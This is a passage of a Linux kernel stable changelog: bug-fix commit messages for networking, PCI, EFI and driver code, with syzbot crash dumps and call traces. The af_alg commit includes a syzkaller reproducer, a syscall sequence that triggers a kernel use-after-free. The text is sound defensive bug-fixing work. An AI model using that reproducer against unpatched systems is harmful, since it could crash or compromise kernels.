Code: ad b8 fb ff c3 66 2e 0f 1f 84 00 00 00 00 00 66 90 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 0f 83 7b b8 fb ff c3 66 2e 0f 1f 84 00 00 00 00
RSP: 002b:00007fafccd0dc78 EFLAGS: 00000246 ORIG\_RAX: 0000000000000031
RAX: ffffffffffffffda RBX: 0000000000000003 RCX: 0000000000457e39
RDX: 0000000000000012 RSI: 0000000020000240 RDI: 0000000000000004
RBP: 000000000073bf00 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 00007fafccd0e6d4
R13: 00000000004bdf8b R14: 00000000004ce4b8 R15: 00000000ffffffff
Sending NMI from CPU 0 to CPUs 1:
NMI backtrace for cpu 1
CPU: 1 PID: 8752 Comm: syz-executor4 Not tainted 5.0.0-rc4+ #51
Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS Google 01/01/2011
RIP: 0010:\_\_x25\_find\_socket+0x78/0x120 net/x25/af\_x25.c:328
Code: 89 f8 48 c1 e8 03 80 3c 18 00 0f 85 a6 00 00 00 4d 8b 64 24 68 4d 85 e4 74 7f e8 03 97 3d fb 49 83 ec 68 74 74 e8 f8 96 3d fb <49> 8d bc 24 88 04 00 00 48 89 f8 48 c1 e8 03 0f b6 04 18 84 c0 74
RSP: 0018:ffff8880639efc58 EFLAGS: 00000246
RAX: 0000000000040000 RBX: dffffc0000000000 RCX: ffffc9000e677000
RDX: 0000000000040000 RSI: ffffffff863244b8 RDI: ffff88806a764628
RBP: ffff8880639efc80 R08: ffff8880a80d05c0 R09: fffffbfff1282775
R10: fffffbfff1282774 R11: ffffffff89413ba3 R12: ffff88806a7645c0
R13: 0000000000000001 R14: ffff88809f29ac00 R15: 0000000000000000
FS: 00007fe8d0c58700(0000) GS:ffff8880ae900000(0000) knlGS:0000000000000000
CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000001b32823000 CR3: 00000000672eb000 CR4: 00000000001406e0
DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
Call Trace:
x25\_new\_lci net/x25/af\_x25.c:357 [inline]
x25\_connect+0x374/0xdf0 net/x25/af\_x25.c:786
\_\_sys\_connect+0x266/0x330 net/socket.c:1686
\_\_do\_sys\_connect net/socket.c:1697 [inline]
\_\_se\_sys\_connect net/socket.c:1694 [inline]
\_\_x64\_sys\_connect+0x73/0xb0 net/socket.c:1694
do\_syscall\_64+0x103/0x610 arch/x86/entry/common.c:290
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
RIP: 0033:0x457e39
Code: ad b8 fb ff c3 66 2e 0f 1f 84 00 00 00 00 00 66 90 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 0f 83 7b b8 fb ff c3 66 2e 0f 1f 84 00 00 00 00
RSP: 002b:00007fe8d0c57c78 EFLAGS: 00000246 ORIG\_RAX: 000000000000002a
RAX: ffffffffffffffda RBX: 0000000000000003 RCX: 0000000000457e39
RDX: 0000000000000012 RSI: 0000000020000200 RDI: 0000000000000004
RBP: 000000000073bf00 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 00007fe8d0c586d4
R13: 00000000004be378 R14: 00000000004ceb00 R15: 00000000ffffffff
Signed-off-by: Eric Dumazet
Reported-by: syzbot
Cc: Andrew Hendry
Cc: linux-x25@vger.kernel.org
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 42038180a1d6f6f0c7ce9a67f70330a7eddcea3d
Author: Jann Horn
Date: Wed Feb 6 22:56:15 2019 +0100
netfilter: nf\_nat\_snmp\_basic: add missing length checks in ASN.1 cbs
commit c4c07b4d6fa1f11880eab8e076d3d060ef3f55fc upstream.
The generic ASN.1 decoder infrastructure doesn't guarantee that callbacks
will get as much data as they expect; callbacks have to check the `datalen`
parameter before looking at `data`. Make sure that snmp\_version() and
snmp\_helper() don't read/write beyond the end of the packet data.
(Also move the assignment to `pdata` down below the check to make it clear
that it isn't necessarily a pointer we can use before the `datalen` check.)
Fixes: cc2d58634e0f ("netfilter: nf\_nat\_snmp\_basic: use asn1 decoder library")
Signed-off-by: Jann Horn
Signed-off-by: Pablo Neira Ayuso
Signed-off-by: Greg Kroah-Hartman
commit 994fc3c7be81882a46e84e544850162b1c6e40bc
Author: Wei Yongjun
Date: Wed Dec 26 11:28:24 2018 +0000
hwmon: (lm80) Fix missing unlock on error in set\_fan\_div()
[ Upstream commit 07bd14ccc3049f9c0147a91a4227a571f981601a ]
Add the missing unlock before return from function set\_fan\_div()
in the error handling case.
Fixes: c9c63915519b ("hwmon: (lm80) fix a missing check of the status of SMBus read")
Signed-off-by: Wei Yongjun
Signed-off-by: Guenter Roeck
Signed-off-by: Sasha Levin
commit 795793799d07c91f9fa2333bfd0865637a3d43dd
Author: Martin Blumenstingl
Date: Sat Feb 9 01:58:50 2019 +0100
mmc: meson-gx: fix interrupt name
[ Upstream commit 83e418a805d880a8b18add07f94d19b2a5a80307 ]
Commit bb364890323cca ("mmc: meson-gx: Free irq in release() callback")
changed the \_probe code to use request\_threaded\_irq() instead of
devm\_request\_threaded\_irq().
Unfortunately this removes a fallback for the interrupt name:
devm\_request\_threaded\_irq() uses the device name as fallback if the
given IRQ name is NULL. request\_threaded\_irq() has no such fallback,
thus /proc/interrupts shows "(null)" instead.
Explicitly pass the dev\_name() so we get the IRQ name shown in
/proc/interrupts again.
While here, also fix the indentation of the request\_threaded\_irq()
parameter list.
Fixes: bb364890323cca ("mmc: meson-gx: Free irq in release() callback")
Signed-off-by: Martin Blumenstingl
Signed-off-by: Ulf Hansson
Signed-off-by: Sasha Levin
commit 2260fa4495500d6997acedeaf2d743622e387d2b
Author: Wei Yongjun
Date: Mon Dec 17 12:19:53 2018 +0000
scsi: target/core: Use kmem\_cache\_free() instead of kfree()
[ Upstream commit 8b2db98e814a5ec45e8800fc22ca9000ae0a517b ]
memory allocated by kmem\_cache\_alloc() should be freed using
kmem\_cache\_free(), not kfree().
Fixes: ad669505c4e9 ("scsi: target/core: Make sure that target\_wait\_for\_sess\_cmds() waits long enough")
Signed-off-by: Wei Yongjun
Reviewed-by: Bart Van Assche
Signed-off-by: Martin K. Petersen
Signed-off-by: Sasha Levin
commit d9778b266837edcd4433e3f8b478eb5c1e4592fc
Author: Logan Gunthorpe
Date: Thu Jan 17 08:46:34 2019 -0600
PCI: Fix \_\_initdata issue with "pci=disable\_acs\_redir" parameter
[ Upstream commit d2fd6e81912a665993b24dcdc1c1384a42a54f7e ]
The disable\_acs\_redir parameter stores a pointer to the string passed to
pci\_setup(). However, the string passed to PCI setup is actually a
temporary copy allocated in static \_\_initdata memory. After init, once the
memory is freed, it is no longer valid to reference this pointer.
This bug was noticed in v5.0-rc1 after a change in commit c5eb1190074c
("PCI / PM: Allow runtime PM without callback functions") caused
pci\_disable\_acs\_redir() to be called during shutdown which manifested
as an unable to handle kernel paging request at:
RIP: 0010:pci\_enable\_acs+0x3f/0x1e0
Call Trace:
pci\_restore\_state.part.44+0x159/0x3c0
pci\_restore\_standard\_config+0x33/0x40
pci\_pm\_runtime\_resume+0x2b/0xd0
? pci\_restore\_standard\_config+0x40/0x40
\_\_rpm\_callback+0xbc/0x1b0
rpm\_callback+0x1f/0x70
? pci\_restore\_standard\_config+0x40/0x40
rpm\_resume+0x4f9/0x710
? pci\_conf1\_read+0xb6/0xf0
? pci\_conf1\_write+0xb2/0xe0
\_\_pm\_runtime\_resume+0x47/0x70
pci\_device\_shutdown+0x1e/0x60
device\_shutdown+0x14a/0x1f0
kernel\_restart+0xe/0x50
\_\_do\_sys\_reboot+0x1ee/0x210
? \_\_fput+0x144/0x1d0
do\_writev+0x5e/0xf0
? do\_writev+0x5e/0xf0
do\_syscall\_64+0x48/0xf0
entry\_SYSCALL\_64\_after\_hwframe+0x44/0xa9
It was also likely possible to trigger this bug when hotplugging PCI
devices.
To fix this, instead of storing a pointer, we use kstrdup() to copy the
disable\_acs\_redir\_param to its own buffer which will never be freed.
Fixes: aaca43fda742 ("PCI: Add "pci=disable\_acs\_redir=" parameter for peer-to-peer support")
Tested-by: Jarkko Nikula
Signed-off-by: Logan Gunthorpe
Signed-off-by: Bjorn Helgaas
Reviewed-by: Jarkko Nikula
Signed-off-by: Sasha Levin
commit da9365ad7b2c3dc9366ddc2789ff86d1c25648a4
Author: Ard Biesheuvel
Date: Tue Feb 19 20:03:13 2019 +0100
efi/arm: Revert "Defer persistent reservations until after paging\_init()"
Commit 582a32e708823e5957fd73ccd78dc4a9e49d21ea upstream.
This reverts commit eff896288872d687d9662000ec9ae11b6d61766f, which
deferred the processing of persistent memory reservations to a point
where the memory may have already been allocated and overwritten,
defeating the purpose.
Signed-off-by: Ard Biesheuvel
Acked-by: Will Deacon
Cc: Linus Torvalds
Cc: Marc Zyngier
Cc: Mike Rapoport
Cc: Peter Zijlstra
Cc: Thomas Gleixner
Cc: linux-arm-kernel@lists.infradead.org
Cc: linux-efi@vger.kernel.org
Link: http://lkml.kernel.org/r/20190215123333.21209-3-ard.biesheuvel@linaro.org
Signed-off-by: Ingo Molnar
Signed-off-by: Ard Biesheuvel
Signed-off-by: Sasha Levin
commit de3d833d6bdd8ba56252556038eccf2118e67c05
Author: Ard Biesheuvel
Date: Tue Feb 19 20:03:12 2019 +0100
arm64, mm, efi: Account for GICv3 LPI tables in static memblock reserve table
Commit 8a5b403d71affa098009cc3dff1b2c45113021ad upstream.
In the irqchip and EFI code, we have what basically amounts to a quirk
to work around a peculiarity in the GICv3 architecture, which permits
the system memory address of LPI tables to be programmable only once
after a CPU reset. This means kexec kernels must use the same memory
as the first kernel, and thus ensure that this memory has not been
given out for other purposes by the time the ITS init code runs, which
is not very early for secondary CPUs.
On systems with many CPUs, these reservations could overflow the
memblock reservation table, and this was addressed in commit:
eff896288872 ("efi/arm: Defer persistent reservations until after paging\_init()")
However, this turns out to have made things worse, since the allocation
of page tables and heap space for the resized memblock reservation table
itself may overwrite the regions we are attempting to reserve, which may
cause all kinds of corruption, also considering that the ITS will still
be poking bits into that memory in response to incoming MSIs.
So instead, let's grow the static memblock reservation table on such
systems so it can accommodate these reservations at an earlier time.
This will permit us to revert the above commit in a subsequent patch.
[ mingo: Minor cleanups. ]
Signed-off-by: Ard Biesheuvel
Acked-by: Mike Rapoport
Acked-by: Will Deacon
Acked-by: Marc Zyngier
Cc: Andrew Morton
Cc: Linus Torvalds
Cc: Peter Zijlstra
Cc: Thomas Gleixner
Cc: linux-arm-kernel@lists.infradead.org
Cc: linux-efi@vger.kernel.org
Link: http://lkml.kernel.org/r/20190215123333.21209-2-ard.biesheuvel@linaro.org
Signed-off-by: Ingo Molnar
[ ardb: Double the size of the slack to account for the lack of an
optimization that was introduced in mainline after the release
of v4.20. ]
Signed-off-by: Ard Biesheuvel
Signed-off-by: Sasha Levin
commit 72d0057ac13f31a150c655d257387189cb03c1bd
Author: Nicolas Dichtel
Date: Thu Jan 17 11:27:22 2019 +0100
af\_packet: fix raw sockets over 6in4 tunnel
[ Upstream commit 88a8121dc1d3d0dbddd411b79ed236b6b6ea415c ]
Since commit cb9f1b783850, scapy (which uses an AF\_PACKET socket in
SOCK\_RAW mode) is unable to send a basic icmp packet over a sit tunnel:
Here is a example of the setup:
$ ip link set ntfp2 up
$ ip addr add 10.125.0.1/24 dev ntfp2
$ ip tunnel add tun1 mode sit ttl 64 local 10.125.0.1 remote 10.125.0.2 dev ntfp2
$ ip addr add fd00:cafe:cafe::1/128 dev tun1
$ ip link set dev tun1 up
$ ip route add fd00:200::/64 dev tun1
$ scapy
>>> p = []
>>> p += IPv6(src='fd00:100::1', dst='fd00:200::1')/ICMPv6EchoRequest()
>>> send(p, count=1, inter=0.1)
>>> quit()
$ ip -s link ls dev tun1 | grep -A1 "TX.\*errors"
TX: bytes packets errors dropped carrier collsns
0 0 1 0 0 0
The problem is that the network offset is set to the hard\_header\_len of the
output device (tun1, ie 14 + 20) and in our case, because the packet is
small (48 bytes) the pskb\_inet\_may\_pull() fails (it tries to pull 40 bytes
(ipv6 header) starting from the network offset).
This problem is more generally related to device with variable hard header
length. To avoid a too intrusive patch in the current release, a (ugly)
workaround is proposed in this patch. It has to be cleaned up in net-next.
Link: https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=993675a3100b1
Link: http://patchwork.ozlabs.org/patch/1024489/
Fixes: cb9f1b783850 ("ip: validate header length on virtual device xmit")
CC: Willem de Bruijn
CC: Maxim Mikityanskiy
Signed-off-by: Nicolas Dichtel
Acked-by: Willem de Bruijn
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit c803706b568aee83ae84b0748709aed6ea260b5a
Author: Alexander Duyck
Date: Fri Feb 15 14:44:18 2019 -0800
net: Do not allocate page fragments that are not skb aligned
[ Upstream commit 3bed3cc4156eedf652b4df72bdb35d4f1a2a739d ]
This patch addresses the fact that there are drivers, specifically tun,
that will call into the network page fragment allocators with buffer sizes
that are not cache aligned. Doing this could result in data alignment
and DMA performance issues as these fragment pools are also shared with the
skb allocator and any other devices that will use napi\_alloc\_frags or
netdev\_alloc\_frags.
Fixes: ffde7328a36d ("net: Split netdev\_alloc\_frag into \_\_alloc\_page\_frag and add \_\_napi\_alloc\_frag")
Reported-by: Jann Horn
Signed-off-by: Alexander Duyck
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit 70bb5dc96692e4843808121805b0b72bb27d0ecf
Author: Murali Karicheri
Date: Mon Feb 18 15:10:51 2019 -0500
net: netcp: Fix ethss driver probe issue
[ Upstream commit 1f43f400a2cbb02f3d34de8fe30075c070254816 ]
Recent commit below has introduced a bug in netcp driver that causes
the ethss driver probe failure and thus break the networking function
on K2 SoCs such as K2HK, K2L, K2E etc. This patch fixes the issue to
restore networking on the above SoCs.
Fixes: 21c328dcecfc ("net: ethernet: Convert to using %pOFn instead of device\_node.name")
Signed-off-by: Murali Karicheri
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit a5cbfe88952c576436d46b03fa6b9164fa7a6497
Author: Eric Dumazet
Date: Fri Feb 15 13:36:21 2019 -0800
tcp: tcp\_v4\_err() should be more careful
[ Upstream commit 2c4cc9712364c051b1de2d175d5fbea6be948ebf ]
ICMP handlers are not very often stressed, we should
make them more resilient to bugs that might surface in
the future.
If there is no packet in retransmit queue, we should
avoid a NULL deref.
Signed-off-by: Eric Dumazet
Reported-by: soukjin bae
Acked-by: Neal Cardwell
Acked-by: Soheil Hassas Yeganeh
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit dd3492bc8f6d243542f32f69adac7a44dc3b7d37
Author: Eric Dumazet
Date: Fri Feb 15 13:36:20 2019 -0800
tcp: clear icsk\_backoff in tcp\_write\_queue\_purge()
[ Upstream commit 04c03114be82194d4a4858d41dba8e286ad1787c ]
soukjin bae reported a crash in tcp\_v4\_err() handling
ICMP\_DEST\_UNREACH after tcp\_write\_queue\_head(sk)
returned a NULL pointer.
Current logic should have prevented this :
if (seq != tp->snd\_una || !icsk->icsk\_retransmits ||
!icsk->icsk\_backoff || fastopen)
break;
Problem is the write queue might have been purged
and icsk\_backoff has not been cleared.
Signed-off-by: Eric Dumazet
Reported-by: soukjin bae
Acked-by: Neal Cardwell
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit 0009ef5717b2af2a69e5e60ec7884b341855323f
Author: David S. Miller
Date: Sat Feb 16 13:44:39 2019 -0800
net: Add header for usage of fls64()
[ Upstream commit 8681ef1f3d295bd3600315325f3b3396d76d02f6 ]
Fixes: 3b89ea9c5902 ("net: Fix for\_each\_netdev\_feature on Big endian")
Suggested-by: Eric Dumazet
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit 67df61cef0ea269336234c0986fe983da22026fe
Author: Jason Wang
Date: Tue Feb 19 14:53:44 2019 +0800
vhost: correctly check the return value of translate\_desc() in log\_used()
[ Upstream commit 816db7663565cd23f74ed3d5c9240522e3fb0dda ]
When fail, translate\_desc() returns negative value, otherwise the
number of iovs. So we should fail when the return value is negative
instead of a blindly check against zero.
Detected by CoverityScan, CID# 1442593: Control flow issues (DEADCODE)
Fixes: cc5e71075947 ("vhost: log dirty page correctly")
Acked-by: Michael S. Tsirkin
Reported-by: Stephen Hemminger
Signed-off-by: Jason Wang
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit bc2b63d41bbf2fb7552d17cb7f42360cd8d27ca8
Author: Kai-Heng Feng
Date: Tue Feb 19 23:45:29 2019 +0800
sky2: Increase D3 delay again
[ Upstream commit 1765f5dcd00963e33f1b8a4e0f34061fbc0e2f7f ]
Another platform requires even longer delay to make the device work
correctly after S3.
So increase the delay to 300ms.
BugLink: https://bugs.launchpad.net/bugs/1798921
Signed-off-by: Kai-Heng Feng
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit 86fac90ccb4404f67a3ad6e2771286ab6bb69390
Author: Alexandre Torgue
Date: Fri Feb 15 10:49:09 2019 +0100
net: stmmac: handle endianness in dwmac4\_get\_timestamp
[ Upstream commit 224babd62d6f19581757a6d8bae3bf9501fc10de ]
GMAC IP is little-endian and used on several kind of CPU (big or little
endian). Main callbacks functions of the stmmac drivers take care about
it. It was not the case for dwmac4\_get\_timestamp function.
Fixes: ba1ffd74df74 ("stmmac: fix PTP support for GMAC4")
Signed-off-by: Alexandre Torgue
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit e89e9dce6e0232bf7a09efe3af6e0a914b454c45
Author: Jose Abreu
Date: Mon Feb 18 14:35:03 2019 +0100
net: stmmac: Fix a race in EEE enable callback
[ Upstream commit 8a7493e58ad688eb23b81e45461c5d314f4402f1 ]
We are saving the status of EEE even before we try to enable it. This
leads to a race with XMIT function that tries to arm EEE timer before we
set it up.
Fix this by only saving the EEE parameters after all operations are
performed with success.
Signed-off-by: Jose Abreu
Fixes: d765955d2ae0 ("stmmac: add the Energy Efficient Ethernet support")
Cc: Joao Pinto
Cc: David S. Miller
Cc: Giuseppe Cavallaro
Cc: Alexandre Torgue
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit 071fb6b8087e2b6c5accc71b6902451453d08a01
Author: Paul Kocialkowski
Date: Fri Feb 15 17:17:08 2019 +0100
net: phy: xgmiitorgmii: Support generic PHY status read
[ Upstream commit 197f9ab7f08ce4b9ece662f747c3991b2f0fbb57 ]
Some PHY drivers like the generic one do not provide a read\_status
callback on their own but rely on genphy\_read\_status being called
directly.
With the current code, this results in a NULL function pointer call.
Call genphy\_read\_status instead when there is no specific callback.
Fixes: f411a6160bd4 ("net: phy: Add gmiitorgmii converter support")
Signed-off-by: Paul Kocialkowski
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit 718f16f5246e5fcae51c4f382ab0a6363e38539d
Author: Lorenzo Bianconi
Date: Fri Feb 15 15:10:32 2019 +0100
net: ip6\_gre: initialize erspan\_ver just for erspan tunnels
[ Upstream commit 4974d5f678abb34401558559d47e2ea3d1c15cba ]
After commit c706863bc890 ("net: ip6\_gre: always reports o\_key to
userspace"), ip6gre and ip6gretap tunnels started reporting TUNNEL\_KEY
output flag even if it is not configured.
ip6gre\_fill\_info checks erspan\_ver value to add TUNNEL\_KEY for
erspan tunnels, however in commit 84581bdae9587 ("erspan: set
erspan\_ver to 1 by default when adding an erspan dev")
erspan\_ver is initialized to 1 even for ip6gre or ip6gretap
Fix the issue moving erspan\_ver initialization in a dedicated routine
Fixes: c706863bc890 ("net: ip6\_gre: always reports o\_key to userspace")
Signed-off-by: Lorenzo Bianconi
Reviewed-by: Greg Rose
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit 6d7a9a07e0f7c46d5cae44f6a635bc2930066a1b
Author: Hauke Mehrtens
Date: Fri Feb 15 17:58:54 2019 +0100
net: Fix for\_each\_netdev\_feature on Big endian
[ Upstream commit 3b89ea9c5902acccdbbdec307c85edd1bf52515e ]
The features attribute is of type u64 and stored in the native endianes on
the system. The for\_each\_set\_bit() macro takes a pointer to a 32 bit array
and goes over the bits in this area. On little Endian systems this also
works with an u64 as the most significant bit is on the highest address,
but on big endian the words are swapped. When we expect bit 15 here we get
bit 47 (15 + 32).
This patch converts it more or less to its own for\_each\_set\_bit()
implementation which works on 64 bit integers directly. This is then
completely in host endianness and should work like expected.
Fixes: fd867d51f ("net/core: generic support for disabling netdev features down stack")
Signed-off-by: Hauke Mehrtens
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit cc5cb5c0d03d9a990dd6d40dce5a5cf96de8e81e
Author: Mao Wenan
Date: Mon Feb 18 10:44:44 2019 +0800
net: crypto set sk to NULL when af\_alg\_release.
[ Upstream commit 9060cb719e61b685ec0102574e10337fa5f445ea ]
KASAN has found use-after-free in sockfs\_setattr.
The existed commit 6d8c50dcb029 ("socket: close race condition between sock\_close()
and sockfs\_setattr()") is to fix this simillar issue, but it seems to ignore
that crypto module forgets to set the sk to NULL after af\_alg\_release.
KASAN report details as below:
BUG: KASAN: use-after-free in sockfs\_setattr+0x120/0x150
Write of size 4 at addr ffff88837b956128 by task syz-executor0/4186
CPU: 2 PID: 4186 Comm: syz-executor0 Not tainted xxx + #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS
1.10.2-1ubuntu1 04/01/2014
Call Trace:
dump\_stack+0xca/0x13e
print\_address\_description+0x79/0x330
? vprintk\_func+0x5e/0xf0
kasan\_report+0x18a/0x2e0
? sockfs\_setattr+0x120/0x150
sockfs\_setattr+0x120/0x150
? sock\_register+0x2d0/0x2d0
notify\_change+0x90c/0xd40
? chown\_common+0x2ef/0x510
chown\_common+0x2ef/0x510
? chmod\_common+0x3b0/0x3b0
? \_\_lock\_is\_held+0xbc/0x160
? \_\_sb\_start\_write+0x13d/0x2b0
? \_\_mnt\_want\_write+0x19a/0x250
do\_fchownat+0x15c/0x190
? \_\_ia32\_sys\_chmod+0x80/0x80
? trace\_hardirqs\_on\_thunk+0x1a/0x1c
\_\_x64\_sys\_fchownat+0xbf/0x160
? lockdep\_hardirqs\_on+0x39a/0x5e0
do\_syscall\_64+0xc8/0x580
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
RIP: 0033:0x462589
Code: f7 d8 64 89 02 b8 ff ff ff ff c3 66 0f 1f 44 00 00 48 89 f8 48 89
f7 48 89 d6 48 89
ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3
48 c7 c1 bc ff ff
ff f7 d8 64 89 01 48
RSP: 002b:00007fb4b2c83c58 EFLAGS: 00000246 ORIG\_RAX: 0000000000000104
RAX: ffffffffffffffda RBX: 000000000072bfa0 RCX: 0000000000462589
RDX: 0000000000000000 RSI: 00000000200000c0 RDI: 0000000000000007
RBP: 0000000000000005 R08: 0000000000001000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 00007fb4b2c846bc
R13: 00000000004bc733 R14: 00000000006f5138 R15: 00000000ffffffff
Allocated by task 4185:
kasan\_kmalloc+0xa0/0xd0
\_\_kmalloc+0x14a/0x350
sk\_prot\_alloc+0xf6/0x290
sk\_alloc+0x3d/0xc00
af\_alg\_accept+0x9e/0x670
hash\_accept+0x4a3/0x650
\_\_sys\_accept4+0x306/0x5c0
\_\_x64\_sys\_accept4+0x98/0x100
do\_syscall\_64+0xc8/0x580
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
Freed by task 4184:
\_\_kasan\_slab\_free+0x12e/0x180
kfree+0xeb/0x2f0
\_\_sk\_destruct+0x4e6/0x6a0
sk\_destruct+0x48/0x70
\_\_sk\_free+0xa9/0x270
sk\_free+0x2a/0x30
af\_alg\_release+0x5c/0x70
\_\_sock\_release+0xd3/0x280
sock\_close+0x1a/0x20
\_\_fput+0x27f/0x7f0
task\_work\_run+0x136/0x1b0
exit\_to\_usermode\_loop+0x1a7/0x1d0
do\_syscall\_64+0x461/0x580
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
Syzkaller reproducer:
r0 = perf\_event\_open(&(0x7f0000000000)={0x0, 0x70, 0x0, 0x0, 0x0, 0x0,
0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, @perf\_config\_ext}, 0x0, 0x0,
0xffffffffffffffff, 0x0)
r1 = socket$alg(0x26, 0x5, 0x0)
getrusage(0x0, 0x0)
bind(r1, &(0x7f00000001c0)=@alg={0x26, 'hash\x00', 0x0, 0x0,
'sha256-ssse3\x00'}, 0x80)
r2 = accept(r1, 0x0, 0x0)
r3 = accept4$unix(r2, 0x0, 0x0, 0x0)
r4 = dup3(r3, r0, 0x0)
fchownat(r4, &(0x7f00000000c0)='\x00', 0x0, 0x0, 0x1000)
Fixes: 6d8c50dcb029 ("socket: close race condition between sock\_close() and sockfs\_setattr()")
Signed-off-by: Mao Wenan
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit f7dad5f466ad3456d1394d45eb3df1f5502cc00b
Author: Petr Machata
Date: Sun Feb 17 07:18:41 2019 +0000
mlxsw: \_\_mlxsw\_sp\_port\_headroom\_set(): Fix a use of local variable
[ Upstream commit 289460404f6947ef1c38e67d680be9a84161250b ]
The function-local variable "delay" enters the loop interpreted as delay
in bits. However, inside the loop it gets overwritten by the result of
mlxsw\_sp\_pg\_buf\_delay\_get(), and thus leaves the loop as quantity in
cells. Thus on second and further loop iterations, the headroom for a
given priority is configured with a wrong size.
Fix by introducing a loop-local variable, delay\_cells. Rename thres to
thres\_cells for consistency.
Fixes: f417f04da589 ("mlxsw: spectrum: Refactor port buffer configuration")
Signed-off-by: Petr Machata
Acked-by: Jiri Pirko
Signed-off-by: Ido Schimmel
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit 60652bbad416e0709f14ce1a0ea98e1afc76c865
Author: Eric Dumazet
Date: Thu Feb 7 12:27:38 2019 -0800
vxlan: test dev->flags & IFF\_UP before calling netif\_rx()
[ Upstream commit 4179cb5a4c924cd233eaadd081882425bc98f44e ]
netif\_rx() must be called under a strict contract.
At device dismantle phase, core networking clears IFF\_UP
and flush\_all\_backlogs() is called after rcu grace period
to make sure no incoming packet might be in a cpu backlog
and still referencing the device.
Most drivers call netif\_rx() from their interrupt handler,
and since the interrupts are disabled at device dismantle,
netif\_rx() does not have to check dev->flags & IFF\_UP
Virtual drivers do not have this guarantee, and must
therefore make the check themselves.
Otherwise we risk use-after-free and/or crashes.
Note this patch also fixes a small issue that came
with commit ce6502a8f957 ("vxlan: fix a use after free
in vxlan\_encap\_bypass"), since the dev->stats.rx\_dropped
change was done on the wrong device.
Fixes: d342894c5d2f ("vxlan: virtual extensible lan")
Fixes: ce6502a8f957 ("vxlan: fix a use after free in vxlan\_encap\_bypass")
Signed-off-by: Eric Dumazet
Cc: Petr Machata
Cc: Ido Schimmel
Cc: Roopa Prabhu
Cc: Stefano Brivio
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit 097f24c676f8855dcfd5d4c75d5bc8ec62ca5d0f
Author: Paolo Abeni
Date: Thu Feb 7 14:13:18 2019 +0100
vsock: cope with memory allocation failure at socket creation time
[ Upstream commit 225d9464268599a5b4d094d02ec17808e44c7553 ]
In the unlikely event that the kmalloc call in vmci\_transport\_socket\_init()
fails, we end-up calling vmci\_transport\_destruct() with a NULL vmci\_trans()
and oopsing.
This change addresses the above explicitly checking for zero vmci\_trans()
at destruction time.
Reported-by: Xiumei Mu
Fixes: d021c344051a ("VSOCK: Introduce VM Sockets")
Signed-off-by: Paolo Abeni
Reviewed-by: Stefano Garzarella
Reviewed-by: Jorgen Hansen
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit 5d5c002b1b24c3d037abb19f008ca343f176f219
Author: Lorenzo Bianconi
Date: Wed Feb 6 19:18:04 2019 +0100
net: ipv4: use a dedicated counter for icmp\_v4 redirect packets
[ Upstream commit c09551c6ff7fe16a79a42133bcecba5fc2fc3291 ]
According to the algorithm described in the comment block at the
beginning of ip\_rt\_send\_redirect, the host should try to send
'ip\_rt\_redirect\_number' ICMP redirect packets with an exponential
backoff and then stop sending them at all assuming that the destination
ignores redirects.
If the device has previously sent some ICMP error packets that are
rate-limited (e.g TTL expired) and continues to receive traffic,
the redirect packets will never be transmitted. This happens since
peer->rate\_tokens will be typically greater than 'ip\_rt\_redirect\_number'
and so it will never be reset even if the redirect silence timeout
(ip\_rt\_redirect\_silence) has elapsed without receiving any packet
requiring redirects.
Fix it by using a dedicated counter for the number of ICMP redirect
packets that has been sent by the host
I have not been able to identify a given commit that introduced the
issue since ip\_rt\_send\_redirect implements the same rate-limiting
algorithm from commit 1da177e4c3f4 ("Linux-2.6.12-rc2")
Signed-off-by: Lorenzo Bianconi
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
commit eb97ee89f84c2f280fab0c9d35697b16414f1cd9
Author: Zhiqiang Liu
Date: Mon Feb 11 10:57:46 2019 +0800
net: fix IPv6 prefix route residue
[ Upstream commit e75913c93f7cd5f338ab373c34c93a655bd309cb ]
Follow those steps:
# ip addr add 2001:123::1/32 dev eth0
